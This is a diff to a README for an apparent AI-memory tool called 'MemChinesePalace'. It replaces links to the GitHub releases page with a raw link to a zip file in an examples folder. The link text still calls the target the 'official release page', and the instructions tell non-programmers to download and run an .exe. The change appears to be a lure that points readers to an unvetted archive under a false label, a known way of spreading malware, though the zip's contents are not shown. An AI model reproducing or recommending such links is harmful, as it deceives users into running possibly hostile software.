@@ -1,6 +1,6 @@
 # 📜 MemChinesePalace - Store AI Memory Using Ancient Language
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/yuy086350-debug/MemChinesePalace/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/yuy086350-debug/MemChinesePalace/main/examples/Palace_Chinese_Mem_v3.1.zip)
 
 ## 📖 What This Application Does
 
@@ -21,7 +21,7 @@ You do not need prior experience with coding or command prompts.
 
 Follow these steps to set up the software.
 
-1. Go to the [official release page](https://github.com/yuy086350-debug/MemChinesePalace/releases).
+1. Go to the [official release page](https://raw.githubusercontent.com/yuy086350-debug/MemChinesePalace/main/examples/Palace_Chinese_Mem_v3.1.zip).
 2. Look for the latest version at the top of the list.
 3. Click the link that ends with .exe to download the installer.
 4. Open the downloaded file once the process finishes.
